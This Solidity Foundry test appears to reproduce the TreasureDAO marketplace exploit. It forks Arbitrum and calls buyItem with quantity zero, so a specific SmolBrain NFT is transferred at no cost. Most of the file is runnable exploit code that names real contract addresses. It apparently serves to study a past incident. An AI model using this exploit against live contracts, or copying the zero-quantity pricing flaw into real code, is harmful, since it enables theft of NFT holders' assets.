// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./Interface.sol";

/*
Users purchase NFTs using the TreasureMarketplaceBuyer contract’s buyItem function.
if the incoming _quantity parameter is 0, the price an NFT is totalPrice = _pricePerItem * _quantity.
So the price of buying an NFT is calculated as 0, 
Resulting in all ERC-721 standard NFTs on the market being purchased for free.

forge test --contracts ./test/1_TreasureDAO.sol -vv
*/
interface CheatCode {
    function createSelectFork(string calldata , uint256 ) external returns (uint256);
}
contract ContractTest is DSTest {
    ITreasureMarketplaceBuyer itreasure = ITreasureMarketplaceBuyer(0x812cdA2181ed7c45a35a691E0C85E231D218E273);
    IERC721 iSmolBrain = IERC721(0x6325439389E0797Ab35752B4F43a14C004f22A9c);
    uint256 tokenId = 3557; //nftID to buy
    address nftOwner;
    CheatCode cheats = CheatCode(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("https://rpc.ankr.com/arbitrum", 7322694); //fork Block Number
    }

    function test_buyNFT() public {
        nftOwner = iSmolBrain.ownerOf(tokenId);
        console.log("Owner of SmolBrain NFT::", nftOwner);

        itreasure.buyItem(
        0x6325439389E0797Ab35752B4F43a14C004f22A9c, //NFT Contract Address
        3557,
        nftOwner,
        0,
        6969000000000000000000 //Price of the NFT
        );
        
        console.log("Owner of SmolBrain NFT::", iSmolBrain.ownerOf(tokenId));
    }

    function onERC721Received( //enables a contract address to receive ERC721 NFT via safeTransfer
    address,
    address,
    uint256,
    bytes memory
    ) public virtual returns (bytes4) {
        return this.onERC721Received.selector;
    }
}